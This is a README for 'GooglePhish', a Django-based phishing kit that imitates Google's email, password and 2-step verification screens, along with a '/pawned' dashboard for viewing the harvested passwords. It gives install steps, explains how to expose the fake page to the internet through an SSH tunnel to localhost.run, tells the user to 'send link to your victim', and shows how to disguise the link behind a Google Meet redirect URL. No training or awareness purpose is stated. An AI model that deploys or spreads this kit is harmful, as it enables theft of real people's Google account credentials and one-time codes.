# GooglePhish

- Google Account Phishing Tool using Python Django Framework.

![GooglePhish](https://user-images.githubusercontent.com/56475750/235306494-57013dd4-ee4f-4625-a0d9-ecf71cf6df1b.png)

## 🧰 Technologies Used

- Python
- Django
- HTML and CSS

## 👀 Preview

### [Live Link](https://shwetkhatri.pythonanywhere.com/)

<hr/>

- Email Screen

<hr/>

![image](https://user-images.githubusercontent.com/56475750/235306086-7f8ccf12-e9ce-4fe5-b8f5-967d7a339f05.png)

<hr/>

- Password Screen

<hr/>

![image](https://user-images.githubusercontent.com/56475750/235306175-6e558593-e393-42c8-b708-83906501c257.png)

<hr/>

- 2-Step Verification Screen

<hr/>

![image](https://user-images.githubusercontent.com/56475750/235306224-aa4517c3-f57c-40d0-b0f4-7dbd151b39ea.png)

<hr/>

## 🧰 Fast Installation Using docker

- Pull created image

  - Install [Docker](https://www.docker.com/products/docker-desktop/)
  - Pull googlephish image

    ```bash
    docker pull ShwetKhatri2001/googlephish
    ```

  - run docker image

    ```bash
    docker run -d -p 8000:8000 ShwetKhatri2001/googlephish -e
    ```

- Build Image and run using build command

  ```bash
    sudo docker build -t googlephish .
  ```

- You can specify your credentials using build arguments like this :

  ```bash
  sudo docker build -t googlephish -e "DJANGO_SUPERUSER_EMAIL=admin@mail.local" -e "DJANGO_SUPERUSER_USERNAME=admin" -e "DJANGO_SUPERUSER_PASSWORD=GooglePhish" .
  ```

- Run docker container

  ```bash
  docker run -d -p 8000:8000 googlephish
  ```

If you have build the dockerfile with no arguments, the default credentials are :

- Username : `admin`
- Password : `G00g13P#15#23`

* Using Docker Compose

  ```bash
   docker-compose up
  ```

  > :warning: Doesn't work yet

## Installation

- Clone/Download repo

  ```bash
  git clone https://github.com/ShwetKhatri2001/GooglePhish.git
  ```

- Create virtual environment

  ```bash
  python3 -m venv env
  ```

- Load virtual environment

  ```bash
  source env/bin/activate
  ```

- Install [Poetry](https://python-poetry.org/docs/)

  ```bash
  python3 -m pip install poetry
  ```

- Install requirements

  ```bash
  poetry install
  ```

- Check for errors

  ```bash
  python3 manage.py check
  ```

  > Proceed if no errors were encountered.

- migrate db

  ```bash
  python3 manage.py makemigrations
  python3 manage.py migrate
  ```

- Create user

  ```bash
  python3 manage.py createsuperuser
  ```

- Collect static files

  ```bash
  python3 manage.py collectstatic
  ```

- Run server

  ```bash
  python3 manage.py runserver
  ```

  > Use `--insecure` tag if any issue is encountered while loading static files.

## Generate and update new random key before using GooglePhish

- Generate and copy new key

  ```bash
  python3 generate_new_key.py
  ```

- update secret key in settings.py of GooglePhish on line 23

  ```python
    # SECURITY WARNING: keep the secret key used in production secret!
    SECRET_KEY = 'your_new_key'
  ```

## View Passwords using GooglePhish Dashboard Page

- Dashboard login page

  ```
  http://127.0.0.1:8000/pawned
  ```

## Start Server

```bash
python3 manage.py runserver
```

> if static files are not loading, turn on debug mode or use
>
> ```bash
> python3 manage.py runserver --insecure
> ```

## For phishing over the internet

- Start server

  ```bash
  python3 manage.py runserver
  ```

- forward port using ssh

  ```bash
  ssh -R 80:localhost:8000 localhost.run
  ```

  > 8000 is port of localhost server.
  > 80 is [localhost.run](https://localhost.run/) server port. Localhost is service that helps you to expose your server running on localhost to the internet, visit their [documentation](https://localhost.run/docs/) for more info

- Now send link to your victim

> You can redirect user from google meet to your phishing page link using
>
> ```
> https://meet.google.com/linkredirect?dest=your_link
> ```

## 🎇 Contributing

If you find bugs with this project, pull requests are always welcome. You can [create an issue here](https://github.com/ShwetKhatri2001/GooglePhish/issues/new).
Your :star: is also greatly appreciated.

[Checkout my GitHub profile and view some more awesome projects](https://github.com/ShwetKhatri2001)
